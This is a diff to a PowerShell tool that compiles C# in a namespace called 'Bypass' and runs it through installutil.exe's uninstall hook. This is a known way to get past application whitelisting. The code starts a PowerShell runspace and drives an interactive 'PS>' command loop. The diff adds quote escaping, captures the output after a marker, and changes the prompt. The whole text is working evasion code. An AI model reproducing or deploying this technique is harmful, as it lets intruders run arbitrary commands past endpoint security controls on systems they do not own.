@@ -8,8 +8,11 @@ Function _Exec {
         $Cmd
     )
 
+    $Cmd = $Cmd.Replace('"', '""');
+
     $csf = New-TemporaryFile;
     $dllf = New-TemporaryFile;
+    $s = "==";
     Set-Content -Path $csf -Value @"
 using System;
 using System.IO;
@@ -32,6 +35,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
+            Console.Write("$s");
             using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                 rs.Open();
 
@@ -51,14 +55,16 @@ namespace Bypass
 "@
     $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
     c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$dllf $csf | Out-Null;
-    c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /nologo /logfile= /logtoconsole=false /U $dllf;
+    $res = c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U $dllf | Out-String;
+    Write-Host $res.SubString($res.IndexOf($s)+$s.Length).TrimEnd();
     Remove-Item $dllf;
     Remove-Item $csf;
 }
 
 Function Invoke-FLM {
     while($true)    {
-        $o = Read-Host -Prompt "PS";
+        Write-Host -NoNewLine "PS> ";
+        $o = Read-Host;
 	if ($o -eq "exit") {
 	    break;
 	}
